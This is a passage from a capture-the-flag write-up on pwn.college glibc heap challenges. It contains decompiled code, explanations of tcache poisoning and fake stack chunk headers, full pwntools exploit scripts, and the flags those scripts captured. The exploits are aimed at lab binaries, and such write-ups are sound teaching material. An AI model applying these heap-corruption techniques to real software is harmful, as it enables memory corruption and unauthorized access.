└┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄│┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘
                      │
        ╭─────────────╯
        │
        v
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  TCACHE_entry A  ┆
├──────────────────┤
│  next: &v15      │ ────╮   (poisoned via scanf on dangling ptr[0])
├──────────────────┤     │
│    key: Void     │     │
└──────────────────┘     │
                         │
         ╭───────────────╯
         │
         v
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  STACK (v15)             ┆
├──────────────────────────┤
│  _QWORD v15[10]          │
└──────────────────────────┘
```

We then `malloc(0, 63)` to drain chunk A, leaving `v15` at the head of the TCACHE. When `stack_malloc_win` calls `malloc(63)`, it pops `v15` and the check passes.

### Exploit

```python title="~/script.py" showLineNumbers
from pwn import *

p = process("/challenge/stack-spoofing-easy")

p.recvuntil(b"quit): ")

def malloc(idx, size):
    p.sendline(b"malloc")
    p.sendline(str(idx).encode())
    p.sendline(str(size).encode())
    p.recvuntil(b"quit): ")

def free(idx):
    p.sendline(b"free")
    p.sendline(str(idx).encode())
    p.recvuntil(b"quit): ")

def scanf(idx, data):
    p.sendline(b"scanf")
    p.sendline(str(idx).encode())
    p.sendline(data)
    p.recvuntil(b"quit): ")

# get v15's address from the stack_malloc_win output
p.sendline(b"stack_malloc_win")
p.recvuntil(b"if (malloc(63) == ")
v15_addr = int(p.recvuntil(b")").strip(b")"), 16)
print(f"[*] v15 addr: {hex(v15_addr)}")
p.recvuntil(b"quit): ")

# allocate two chunks in the same bin as malloc(63)
malloc(0, 72)
malloc(1, 72)
free(1)
free(0)

# poison chunk A's next to point to v15
scanf(0, p64(v15_addr))

# drain chunk A
malloc(0, 63)

# stack_malloc_win's malloc(63) pops v15, triggering win
p.sendline(b"stack_malloc_win")
print(p.recvall(timeout=3).decode())
```

```
hacker@dynamic-allocator-misuse~stack-spoofing-easy:/$ python ~/script.py 
[+] Starting local process '/challenge/stack-spoofing-easy': pid 25794
[*] v15 addr: 0x7ffd9f7d0700
[+] Receiving all data: Done (289B)
[*] Stopped process '/challenge/stack-spoofing-easy' (pid 25794)

[*] if (malloc(63) == 0x7ffd9f7d0700) win()
[*] malloc_usable_size(malloc(63)) = 72
[*] malloc(63) = 0x7ffd9f7d0700
You win! Here is your flag:
pwn.college{07HJidoeBZC_x5Mse2AW6v4D92j.01M5MDL4ITM0EzW}
```

&nbsp;

## Stack Spoofing (Hard)

```
hacker@dynamic-allocator-misuse~stack-spoofing-hard:/$ /challenge/stack-spoofing-hard
###
### Welcome to /challenge/stack-spoofing-hard!
###


[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/stack_malloc_win/quit):
```

### Binary Analysis

```c title="/challenge/stack-spoofing-hard :: main() :: Pseudocode" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  unsigned int v5; // [rsp+28h] [rbp-1A8h]
  unsigned int v6; // [rsp+28h] [rbp-1A8h]
  unsigned int v7; // [rsp+28h] [rbp-1A8h]
  unsigned int v8; // [rsp+28h] [rbp-1A8h]
  unsigned int size; // [rsp+2Ch] [rbp-1A4h]
  void *ptr[16]; // [rsp+40h] [rbp-190h] BYREF
  char s1[128]; // [rsp+C0h] [rbp-110h] BYREF
  _BYTE v12[64]; // [rsp+140h] [rbp-90h] BYREF
  _QWORD v13[10]; // [rsp+180h] [rbp-50h] BYREF

  v13[9] = __readfsqword(0x28u);
  setvbuf(stdin, nullptr, 2, 0);
  setvbuf(stdout, nullptr, 2, 1u);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  memset(ptr, 0, sizeof(ptr));
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          while ( 1 )
          {
            while ( 1 )
            {
              while ( 1 )
              {
                puts(byte_2124);
                printf("[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/stack_malloc_win/quit): ");
                __isoc99_scanf("%127s", s1);
                puts(byte_2124);
                if ( strcmp(s1, "malloc") )
                  break;
                printf("Index: ");
                __isoc99_scanf("%127s", s1);
                puts(byte_2124);
                v5 = atoi(s1);
                if ( v5 > 0xF )
                  __assert_fail("allocation_index < 16", "<stdin>", 0x5Au, "main");
                printf("Size: ");
                __isoc99_scanf("%127s", s1);
                puts(byte_2124);
                size = atoi(s1);
                ptr[v5] = malloc(size);
              }
              if ( strcmp(s1, "free") )
                break;
              printf("Index: ");
              __isoc99_scanf("%127s", s1);
              puts(byte_2124);
              v6 = atoi(s1);
              if ( v6 > 0xF )
                __assert_fail("allocation_index < 16", "<stdin>", 0x6Au, "main");
              free(ptr[v6]);
            }
            if ( strcmp(s1, "puts") )
              break;
            printf("Index: ");
            __isoc99_scanf("%127s", s1);
            puts(byte_2124);
            v7 = atoi(s1);
            if ( v7 > 0xF )
              __assert_fail("allocation_index < 16", "<stdin>", 0x76u, "main");
            printf("Data: ");
            puts((const char *)ptr[v7]);
          }
          if ( strcmp(s1, "scanf") )
            break;
          printf("Index: ");
          __isoc99_scanf("%127s", s1);
          puts(byte_2124);
          v8 = atoi(s1);
          if ( v8 > 0xF )
            __assert_fail("allocation_index < 16", "<stdin>", 0x82u, "main");
          v3 = malloc_usable_size(ptr[v8]);
          sprintf(s1, "%%%us", v3);
          __isoc99_scanf(s1, ptr[v8]);
          puts(byte_2124);
        }
        if ( strcmp(s1, "stack_free") )
          break;
        free(v13);
      }
      if ( strcmp(s1, "stack_scanf") )
        break;
      __isoc99_scanf("%127s", v12);
      puts(byte_2124);
    }
    if ( strcmp(s1, "stack_malloc_win") )
      break;
    if ( malloc(0x75u) == v13 )
      win();
  }
  if ( strcmp(s1, "quit") )
    puts("Unrecognized choice!");
  puts("### Goodbye!");
  return 0;
}
```

The goal is the same as the easy version: make `malloc(0x75)` return `v13`'s address. The difference is that this binary prints nothing, no address leaks, and `stack_free` aborts immediately with `munmap_chunk(): invalid pointer` because `v13` has no valid chunk header in the memory before it.

### Forging a Chunk Header

For `free` to accept a pointer, the allocator checks the size field stored 8 bytes before the pointer (`ptr-0x8`). If that value is not a plausible chunk size, the allocator aborts.

Every heap chunk in glibc has a fixed layout. The pointer returned by `malloc` points to the user data, but the 8 bytes before it contain the chunk's size field, and the 8 bytes before that contain the previous chunk's size:

<figure style={{ textAlign: 'center' }}>
   <img alt="image" src="https://github.com/user-attachments/assets/eb0d2bc8-1314-4319-8063-89d5ad40e325" />
   <figcaption>Source: [Azeria labs](https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/)</figcaption>
</figure>

When `free(ptr)` is called, glibc reads `ptr-0x8` to get the chunk size and determine which bin to use. For real heap chunks this field is written automatically by `malloc` at allocation time. Since `v13` is on the stack, nothing ever wrote a valid size there, so `free` aborts with `munmap_chunk(): invalid pointer`.

`v13` is at `[rbp-0x50]` and `v12` (the `stack_scanf` buffer) is at `[rbp-0x90]`. The offset between them is `0x40` = 64 bytes. Since `stack_scanf` reads up to 127 bytes, we can write past `v12` and into the memory just before `v13`.

The fake size field needs to sit at `v13-0x8` = `rbp-0x58`, which is `rbp-0x90 + 0x38` = 56 bytes into the `stack_scanf` buffer. We write 56 bytes of padding followed by a valid size value.

`malloc(0x75)` rounds up to a 128-byte chunk, which corresponds to size `0x81` (128 with the `PREV_INUSE` bit set). Writing `0x81` at `v13-0x8` makes the allocator believe `v13` is a valid 128-byte chunk:

```
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  STACK                                                  ┆
├─────────────────────────────────────────────────────────┤
│  rbp-0x90: v12  <- stack_scanf writes here              │
│            "A" * 56 bytes of padding                    │
├─────────────────────────────────────────────────────────┤
│  rbp-0x58: fake size field = 0x81  <- v13 - 0x8         │
├─────────────────────────────────────────────────────────┤
│  rbp-0x50: v13  <- stack_free frees here                │
│            stack_malloc_win checks malloc(0x75) == here │
└─────────────────────────────────────────────────────────┘
```

With the fake header in place, `stack_free` succeeds and puts `v13` into the TCACHE bin for 113-128 byte chunks. Then `stack_malloc_win`'s `malloc(0x75)` pops it back out, the check passes, and `win()` is called.

### Exploit

```python title="~/script.py" showLineNumbers
from pwn import *

p = process("/challenge/stack-spoofing-hard")
p.recvuntil(b"quit): ")

# write fake chunk size field 56 bytes into v12, landing at v13-0x8
p.sendline(b"stack_scanf")
p.sendline(b"A" * 56 + p64(0x81))
p.recvuntil(b"quit): ")

# now stack_free succeeds, v13 is a valid-looking chunk
p.sendline(b"stack_free")
p.recvuntil(b"quit): ")

# malloc(0x75) pops v13 from TCACHE, triggering win
p.sendline(b"stack_malloc_win")
print(p.recvall(timeout=3).decode())
```

```
hacker@dynamic-allocator-misuse~stack-spoofing-hard:/$ python ~/script.py 
[+] Starting local process '/challenge/stack-spoofing-hard': pid 101583
[+] Receiving all data: Done (173B)
[*] Stopped process '/challenge/stack-spoofing-hard' (pid 101583)

You win! Here is your flag:
pwn.college{UO-knMx2TfsXlZ5xVxHIS2Fcp-x.0FN5MDL4ITM0EzW}
```

&nbsp;

## Stack Summoning (Easy)

```
hacker@dynamic-allocator-misuse~stack-summoning-easy:/$ /challenge/stack-summoning-easy
###
### Welcome to /challenge/stack-summoning-easy!
###

This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
challenges, you will become familiar with the concept of heap exploitation.

This challenge can manage up to 16 unique allocations.

In this challenge, there is a secret stored at 0x7fff3d654099.
If you can leak out this secret, you can redeem it for the flag.


[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/send_flag/quit):
```

### Binary Analysis

```c title="/challenge/stack-summoning-easy :: main() :: Pseudocode" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  int v4; // eax
  int i; // [rsp+2Ch] [rbp-234h]
  unsigned int v7; // [rsp+30h] [rbp-230h]
  unsigned int v8; // [rsp+30h] [rbp-230h]
  unsigned int v9; // [rsp+30h] [rbp-230h]
  unsigned int v10; // [rsp+30h] [rbp-230h]
  unsigned int size; // [rsp+34h] [rbp-22Ch]
  void *ptr[16]; // [rsp+40h] [rbp-220h] BYREF
  _BYTE v13[64]; // [rsp+C0h] [rbp-1A0h] BYREF
  _BYTE v14[185]; // [rsp+100h] [rbp-160h] BYREF
  char v15[23]; // [rsp+1B9h] [rbp-A7h] BYREF
  char s1[136]; // [rsp+1D0h] [rbp-90h] BYREF
  unsigned __int64 v17; // [rsp+258h] [rbp-8h]

  v17 = __readfsqword(0x28u);
  setvbuf(stdin, nullptr, 2, 0);
  setvbuf(stdout, nullptr, 2, 1u);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  memset(ptr, 0, sizeof(ptr));
  for ( i = 0; i <= 15; ++i )
    v15[i] = rand() % 26 + 97;
  puts(
    "This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of");
  puts("challenges, you will become familiar with the concept of heap exploitation.\n");
  printf("This challenge can manage up to %d unique allocations.\n\n", 16);
  printf("In this challenge, there is a secret stored at %p.\n", v15);
  puts("If you can leak out this secret, you can redeem it for the flag.\n");
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          while ( 1 )
          {
            while ( 1 )
            {
              while ( 1 )
              {
                print_tcache(main_thread_tcache);
                puts(byte_35BA);
                printf("[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/send_flag/quit): ");
                __isoc99_scanf("%127s", s1);
                puts(byte_35BA);
                if ( strcmp(s1, "malloc") )
                  break;
                printf("Index: ");
                __isoc99_scanf("%127s", s1);
                puts(byte_35BA);
                v7 = atoi(s1);
                if ( v7 > 0xF )
                  __assert_fail("allocation_index < 16", "<stdin>", 0x118u, "main");
                printf("Size: ");
                __isoc99_scanf("%127s", s1);
                puts(byte_35BA);
                size = atoi(s1);
                printf("[*] allocations[%d] = malloc(%d)\n", v7, size);
                ptr[v7] = malloc(size);
                printf("[*] allocations[%d] = %p\n", v7, ptr[v7]);
              }
              if ( strcmp(s1, "free") )
                break;
              printf("Index: ");
              __isoc99_scanf("%127s", s1);
              puts(byte_35BA);
              v8 = atoi(s1);
              if ( v8 > 0xF )
                __assert_fail("allocation_index < 16", "<stdin>", 0x12Au, "main");
              printf("[*] free(allocations[%d])\n", v8);
              free(ptr[v8]);
            }
            if ( strcmp(s1, "puts") )
              break;
            printf("Index: ");
            __isoc99_scanf("%127s", s1);
            puts(byte_35BA);
            v9 = atoi(s1);
            if ( v9 > 0xF )
              __assert_fail("allocation_index < 16", "<stdin>", 0x137u, "main");
            printf("[*] puts(allocations[%d])\n", v9);
            printf("Data: ");
            puts((const char *)ptr[v9]);
          }
          if ( strcmp(s1, "scanf") )
            break;
          printf("Index: ");
          __isoc99_scanf("%127s", s1);
          puts(byte_35BA);
          v10 = atoi(s1);
          if ( v10 > 0xF )
            __assert_fail("allocation_index < 16", "<stdin>", 0x144u, "main");
          v3 = malloc_usable_size(ptr[v10]);
          sprintf(s1, "%%%us", v3);
          v4 = malloc_usable_size(ptr[v10]);
          printf("[*] scanf(\"%%%us\", allocations[%d])\n", v4, v10);
          __isoc99_scanf(s1, ptr[v10]);
          puts(byte_35BA);
        }
        if ( strcmp(s1, "send_flag") )
          break;
        printf("Secret: ");
        __isoc99_scanf("%127s", s1);
        puts(byte_35BA);
        if ( !memcmp(s1, v15, 0x10u) )
        {
          puts("Authorized!");
          win();
        }
        else
        {
          puts("Not authorized!");
        }
      }
      if ( strcmp(s1, "stack_free") )
        break;
      printf("[*] free(%p)\n", v14);
      free(v14);
    }
    if ( strcmp(s1, "stack_scanf") )
      break;
    printf("[*] scanf(\"%%127s\", %p)\n", v13);
    __isoc99_scanf("%127s", v13);
    puts(byte_35BA);
  }
  if ( strcmp(s1, "quit") )
    puts("Unrecognized choice!");
  puts("### Goodbye!");
  return 0;
}
```

This challenge is essentially the same as the [Seeking Secrets](#seeking-secrets-easy) challenges. A 16-byte secret is stored at a known address, printed at startup, and we have to leak it using tcache poisoning. The only difference is that the secret lives on the stack rather than in the data segment. Since the stack address is printed at startup just like the BSS address was in Seeking Secrets, this makes no difference to the exploit.

The `stack_free` and `stack_scanf` commands are not needed at all for the easy version. The solution uses only the standard heap primitives.

### Polluting Tcache `entry_struct` to Leak the Secret

The approach is identical to Seeking Secrets. We allocate two heap chunks, free them into the tcache, and poison the first chunk's `next` to point at `secret_addr`. We then `malloc` twice and `puts` on the second allocation to leak the secret.

The one subtlety is that the tcache count must be at least 1 when we call the final `malloc` that should return `secret_addr`. When `malloc` pops a chunk, it reads that chunk's `next` field, writes it into `entries[idx]`, and decrements `counts[idx]`. If count drops to 0, the next `malloc` call bypasses the tcache entirely, even if `entries[idx]` points somewhere valid.

With two heap chunks freed (count=2), the sequence works out correctly:

1. `free(1)`, `free(0)`, tcache: `A -> B`, count=2
2. Poison `A`'s `next` to `secret_addr`, tcache: `A -> secret_addr`, count=2
3. `malloc` pops `A`, count=1, `entries = secret_addr`
4. `malloc`, count=1 so tcache is used, pops `secret_addr`, count=0

```
free(1), free(0)


┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┊  tcache_perthread_struct Void                                        ┊
┊            ┏━━━━━━━━━━━━━━━━┓                                        ┊
┊    counts: ┃ count_192: 2   ┃                                        ┊
┊            ┣━━━━━━━━━━━━━━━━┫                                        ┊
┊   entries: ┃ entry_192: &A  ┃                                        ┊
┊            ┗━━━━━━━━━━━━━━━━┛                                        ┊
└┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄│┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘
                          │
        ╭─────────────────╯
        │
        v
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  tcache_entry A  ┆
├──────────────────┤
│    next: &B      │ ────╮
├──────────────────┤     │
│    key: Void     │     │
└──────────────────┘     │
                         │
        ╭────────────────╯
        │
        v
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  tcache_entry B  ┆
├──────────────────┤
│    next: NULL    │
├──────────────────┤
│    key: Void     │
└──────────────────┘


scanf(0, p64(secret_addr))


┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┊  tcache_perthread_struct Void                                        ┊
┊            ┏━━━━━━━━━━━━━━━━┓                                        ┊
┊    counts: ┃ count_192: 2   ┃                                        ┊
┊            ┣━━━━━━━━━━━━━━━━┫                                        ┊
┊   entries: ┃ entry_192: &A  ┃                                        ┊
┊            ┗━━━━━━━━━━━━━━━━┛                                        ┊
└┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄│┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘
                          │
        ╭─────────────────╯
        │
        v
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  tcache_entry A  ┆
├──────────────────┤
│ next: secret_addr│ ────╮  (B is now orphaned)
├──────────────────┤     │
│    key: Void     │     │
└──────────────────┘     │
                         │
        ╭────────────────╯
        │
        v
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  STACK (secret_addr)     ┆
├──────────────────────────┤
│  next: secret[:8]        │
├──────────────────────────┤
│  key:  secret[8:16]      │
└──────────────────────────┘


malloc(2) -> pops A, count=1, entries=secret_addr
malloc(3) -> count=1 so tcache is used, pops secret_addr, count=0
```

### Exploit

```python title="~/script.py" showLineNumbers
from pwn import *

p = process("/challenge/stack-summoning-easy")

p.recvuntil(b"secret stored at ")
secret_addr = int(p.recvuntil(b".").strip(b"."), 16)
print(f"[*] secret at: {hex(secret_addr)}")

p.recvuntil(b"quit): ")

def malloc_leak(idx, size):
    p.sendline(b"malloc")
    p.sendline(str(idx).encode())
    p.sendline(str(size).encode())
    p.recvuntil(b"= malloc(%d)\n" % size)
    p.recvuntil(b"allocations[%d] = " % idx)
    addr = int(p.recvuntil(b"\n").strip(), 16)
    p.recvuntil(b"quit): ")
    return addr

def free_chunk(idx):
    p.sendline(b"free")
    p.sendline(str(idx).encode())
    p.recvuntil(b"quit): ")

def scanf_chunk(idx, data):
    p.sendline(b"scanf")
    p.sendline(str(idx).encode())
    p.sendline(data)
    p.recvuntil(b"quit): ")

def puts_chunk(idx):
    p.sendline(b"puts")
    p.sendline(str(idx).encode())
    p.recvuntil(b"Data: ")
    data = p.recvuntil(b"\n", drop=True)
    p.recvuntil(b"quit): ")
    return data

# allocate two heap chunks
a = malloc_leak(0, 192)
b = malloc_leak(1, 192)
print(f"[*] a: {hex(a)}")
print(f"[*] b: {hex(b)}")

# free b then a: tcache = a->b, count=2
free_chunk(1)
free_chunk(0)

# poison a's next to point at secret_addr
scanf_chunk(0, p64(secret_addr))

# malloc(2) pops a, count=1, entries=secret_addr
c = malloc_leak(2, 192)
print(f"[*] malloc(2) = {hex(c)}")

# malloc(3): count=1 so tcache is used, pops secret_addr
d = malloc_leak(3, 192)
print(f"[*] malloc(3) = {hex(d)}")

secret = puts_chunk(3).ljust(16, b"\x00")[:16]
print(f"[*] secret: {secret}")

p.sendline(b"send_flag")
p.sendline(secret)
print(p.recvuntil(b"}").decode())
```

```
hacker@dynamic-allocator-misuse~stack-summoning-easy:/$ python ~/script.py 
[+] Starting local process '/challenge/stack-summoning-easy': pid 552
[*] secret at: 0x7ffe05789919
[*] a: 0x61d8d729f2c0
[*] b: 0x61d8d729f390
[*] malloc(2) = 0x61d8d729f2c0
[*] malloc(3) = 0x7ffe05789919
[*] secret: b'gfpzbhga\x00\x00\x00\x00\x00\x00\x00\x00'

Secret: 
Authorized!
You win! Here is your flag:
pwn.college{oPteTG796tBkHRpITEGLmil50q9.0VN5MDL4ITM0EzW}
[*] Stopped process '/challenge/stack-summoning-easy' (pid 552)
```

&nbsp;

## Stack Summoning (Hard)

```
hacker@dynamic-allocator-misuse~stack-summoning-hard:/$ /challenge/stack-summoning-hard
###
### Welcome to /challenge/stack-summoning-hard!
###


[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/send_flag/quit):
```

The solution for the hard version is different from the easy one. Instead of leaking the secret and submitting it, we overwrite it with a known value and submit that instead.

### Binary Analysis

```c title="/challenge/stack-summoning-hard :: main() :: Pseudocode" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  int i; // [rsp+2Ch] [rbp-204h]
  unsigned int v6; // [rsp+30h] [rbp-200h]
  unsigned int v7; // [rsp+30h] [rbp-200h]
  unsigned int v8; // [rsp+30h] [rbp-200h]
  unsigned int v9; // [rsp+30h] [rbp-200h]
  unsigned int size; // [rsp+34h] [rbp-1FCh]
  void *ptr[16]; // [rsp+40h] [rbp-1F0h] BYREF
  _BYTE v12[64]; // [rsp+C0h] [rbp-170h] BYREF
  __int64 v13; // [rsp+100h] [rbp-130h] BYREF
  char v14[22]; // [rsp+18Ah] [rbp-A6h] BYREF
  char s1[136]; // [rsp+1A0h] [rbp-90h] BYREF
  unsigned __int64 v16; // [rsp+228h] [rbp-8h]

  v16 = __readfsqword(0x28u);
  setvbuf(stdin, nullptr, 2, 0);
  setvbuf(stdout, nullptr, 2, 1u);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  memset(ptr, 0, sizeof(ptr));
  for ( i = 0; i <= 15; ++i )
    v14[i] = rand() % 26 + 97;
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          while ( 1 )
          {
            while ( 1 )
            {
              while ( 1 )
              {
                puts(byte_214C);
                printf("[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/send_flag/quit): ");
                __isoc99_scanf("%127s", s1);
                puts(byte_214C);
                if ( strcmp(s1, "malloc") )
                  break;
                printf("Index: ");
                __isoc99_scanf("%127s", s1);
                puts(byte_214C);
                v6 = atoi(s1);
                if ( v6 > 0xF )
                  __assert_fail("allocation_index < 16", "<stdin>", 0x73u, "main");
                printf("Size: ");
                __isoc99_scanf("%127s", s1);
                puts(byte_214C);
                size = atoi(s1);
                ptr[v6] = malloc(size);
              }
              if ( strcmp(s1, "free") )
                break;
              printf("Index: ");
              __isoc99_scanf("%127s", s1);
              puts(byte_214C);
              v7 = atoi(s1);
              if ( v7 > 0xF )
                __assert_fail("allocation_index < 16", "<stdin>", 0x83u, "main");
              free(ptr[v7]);
            }
            if ( strcmp(s1, "puts") )
              break;
            printf("Index: ");
            __isoc99_scanf("%127s", s1);
            puts(byte_214C);
            v8 = atoi(s1);
            if ( v8 > 0xF )
              __assert_fail("allocation_index < 16", "<stdin>", 0x8Fu, "main");
            printf("Data: ");
            puts((const char *)ptr[v8]);
          }
          if ( strcmp(s1, "scanf") )
            break;
          printf("Index: ");
          __isoc99_scanf("%127s", s1);
          puts(byte_214C);
          v9 = atoi(s1);
          if ( v9 > 0xF )
            __assert_fail("allocation_index < 16", "<stdin>", 0x9Bu, "main");
          v3 = malloc_usable_size(ptr[v9]);
          sprintf(s1, "%%%us", v3);
          __isoc99_scanf(s1, ptr[v9]);
          puts(byte_214C);
        }
        if ( strcmp(s1, "send_flag") )
          break;
        printf("Secret: ");
        __isoc99_scanf("%127s", s1);
        puts(byte_214C);
        if ( !memcmp(s1, v14, 0x10u) )
        {
          puts("Authorized!");
          win();
        }
        else
        {
          puts("Not authorized!");
        }
      }
      if ( strcmp(s1, "stack_free") )
        break;
      free(&v13);
    }
    if ( strcmp(s1, "stack_scanf") )
      break;
    __isoc99_scanf("%127s", v12);
    puts(byte_214C);
  }
  if ( strcmp(s1, "quit") )
    puts("Unrecognized choice!");
  puts("### Goodbye!");
  return 0;
}
```

This version prints nothing: no address leaks, no tcache display, no allocation addresses. So we cannot use the same approach as the easy version since we have no way to know `v14`'s address to poison the tcache with.

Instead we take the opposite approach: rather than leaking the secret, we overwrite it with a value we choose, then submit that value to `send_flag`.

### Overwriting the Secret

The stack layout gives us everything we need:

- `v12` at `[rbp-0x170]`, written by `stack_scanf`
- `v13` at `[rbp-0x130]`, freed by `stack_free`
- `v14` at `[rbp-0xa6]`, the secret

`v13` is 64 bytes past `v12`, so `stack_scanf` can plant a fake size field at `v13 - 0x8` (56 bytes into `v12`) just like the Stack Spoofing Hard challenge. We use `0xb1` as the fake size, giving a chunk of 176 bytes with `malloc_usable_size` returning 168 bytes.

After `stack_free` puts `v13` into the tcache, we `malloc` of the same size to get `v13` back into `ptr[0]`. Now `ptr[0]` points directly at `v13`. `v14` sits at `v13 + 0x8a` = offset 138. Since `malloc_usable_size` returns 168 bytes, heap `scanf` lets us write 168 bytes into `ptr[0]`, which is more than enough to reach `v14` at offset 138.

```
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┊  STACK                                                               ┊
├──────────────────────────────────────────────────────────────────────┤
│  rbp-0x170: v12  <- stack_scanf writes here                          │
│             "B" * 56 bytes of padding                                │
├──────────────────────────────────────────────────────────────────────┤
│  rbp-0x138: fake size field = 0xb1  <- v13 - 0x8                     │
├──────────────────────────────────────────────────────────────────────┤
│  rbp-0x130: v13  <- stack_free frees here, malloc returns here       │
│             ptr[0] = &v13                                            │
│             "B" * 138 bytes of padding via heap scanf                │
├──────────────────────────────────────────────────────────────────────┤
│  rbp-0x0a6: v14  <- secret, overwritten with "AAAAAAAAAAAAAAAA"      │
└──────────────────────────────────────────────────────────────────────┘
```

We write 138 bytes of padding followed by our chosen 16-byte secret into `ptr[0]`, overwriting `v14`. Then we submit that known secret to `send_flag`.

### Exploit

```python title="~/script.py" showLineNumbers
from pwn import *

p = process("/challenge/stack-summoning-hard")
p.recvuntil(b"quit): ")

known_secret = b"AAAAAAAAAAAAAAAA"

def malloc_idx(idx, size):
    p.sendline(b"malloc")
    p.sendline(str(idx).encode())
    p.sendline(str(size).encode())
    p.recvuntil(b"quit): ")

def free_chunk(idx):
    p.sendline(b"free")
    p.sendline(str(idx).encode())
    p.recvuntil(b"quit): ")

def scanf_chunk(idx, data):
    p.sendline(b"scanf")
    p.sendline(str(idx).encode())
    p.sendline(data)
    p.recvuntil(b"quit): ")

# forge fake size at v13-0x8 (56 bytes into v12)
# 0xb1 = 176 byte chunk, malloc_usable_size returns 168
p.sendline(b"stack_scanf")
p.sendline(b"A" * 56 + p64(0xb1))
p.recvuntil(b"quit): ")

# free v13 into tcache
p.sendline(b"stack_free")
p.recvuntil(b"quit): ")

# malloc to get v13 back as ptr[0]
malloc_idx(0, 160)

# v14 is at v13+0x8a = offset 138
# overwrite v14 with our known secret
scanf_chunk(0, b"B" * 138 + known_secret)

# submit known secret
p.sendline(b"send_flag")
p.sendline(known_secret)
print(p.recvall(timeout=3).decode())
```

```
hacker@dynamic-allocator-misuse~stack-summoning-hard:/$ python ~/script.py 
[+] Starting local process '/challenge/stack-summoning-hard': pid 2531
[+] Receiving all data: Done (187B)
[*] Stopped process '/challenge/stack-summoning-hard' (pid 2531)

Secret: 
Authorized!
You win! Here is your flag:
pwn.college{A0nx5d15jSFQQZxlfrkuIFs1Cfb.0lN5MDL4ITM0EzW}



[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/send_flag/quit): 
```

&nbsp;

Here is the writeup with em dashes replaced by commas:

## Enterprising Echo (Easy)

```
hacker@dynamic-allocator-misuse~enterprising-echo-easy:/$ /challenge/enterprising-echo-easy
###
### Welcome to /challenge/enterprising-echo-easy!
###

This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
challenges, you will become familiar with the concept of heap exploitation.

This challenge can manage up to 16 unique allocations.


[*] Function (malloc/free/echo/scanf/stack_free/stack_scanf/quit):
```

### Binary Analysis

```c title="/challenge/enterprising-echo-easy :: main() :: Pseudocode" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  // ...
  void *ptr[16]; // [rsp+40h] [rbp-190h] BYREF
  char s1[128];  // [rsp+C0h] [rbp-110h] BYREF
  _BYTE v14[64]; // [rsp+140h] [rbp-90h] BYREF  <- stack_scanf writes here
  _QWORD v15[10];// [rsp+180h] [rbp-50h] BYREF  <- stack_free frees this
  // ...

  // stack_free
  printf("[*] free(%p)\n", v15);
  free(v15);

  // stack_scanf
  printf("[*] scanf(\"%%127s\", %p)\n", v14);
  __isoc99_scanf("%127s", v14);
}
```

```c title="/challenge/enterprising-echo-easy :: echo() :: Pseudocode" showLineNumbers
unsigned __int64 __fastcall echo(__int64 a1, __int64 a2)
{
  char **argv;
